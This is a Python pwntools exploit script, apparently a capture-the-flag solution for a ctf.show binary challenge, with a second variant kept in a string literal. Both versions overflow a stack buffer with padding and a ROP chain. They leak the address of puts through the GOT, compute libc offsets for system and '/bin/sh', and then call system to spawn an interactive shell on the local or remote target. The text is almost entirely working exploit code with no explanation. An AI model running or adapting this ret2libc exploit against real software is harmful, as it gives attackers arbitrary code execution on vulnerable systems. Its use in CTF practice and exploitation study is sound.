from pwn import *
from kk import *
context(arch = 'amd64',os = 'linux')



#p = remote('pwn.challenge.ctf.show', 28282)
p = process('./pwn')    
elf = ELF('./pwn')


main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
read_got = elf.got['read']
write_plt = elf.plt['write']
write_got = elf.got['write']
pop_rdi_addr = 0x400803
pop_rdi_addr = 0x400803

ret = 0x4004fe
#
#gdb.attach(p,'b *0x40071D')
#pause()
GDB(p)
p.recvline(b'O.o?')
payload = b'A' *(0x70+8) + p64(ret) + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendline(payload)

puts = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts))


system_addr = puts 	-0x31580
binsh_addr = puts   + 0x1334da

p.recvline(b'O.o?')
#gdb.attach(p)
payload2 = b'A' *(0x70+8) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload2)

p.interactive()






'''





from pwn import *
context(arch = 'amd64',os = 'linux')

p = remote('pwn.challenge.ctf.show', 28282)
#p = process('./pwn')    
elf = ELF('./pwn')

main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
read_got = elf.got['read']
write_plt = elf.plt['write']
write_got = elf.got['write']
pop_rdi_addr = 0x400803
pop_rdi_addr = 0x400803

ret = 0x4004fe
#gdb.attach(p,'b *0x40071D')

p.recvline(b'O.o?')
payload = b'A' *(0x70+8) + p64(ret) + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendline(payload)

puts = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts))

#libc = LibcSearcher('puts',puts)
libc_base = puts - 0x0809c0
print(hex(libc_base))
system_addr = libc_base + 0x04f440
binsh_addr = libc_base + 0x1b3e9a

p.recvline(b'O.o?')
#gdb.attach(p)
payload2 = b'A' *(0x70+8) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload2)

p.interactive()
'''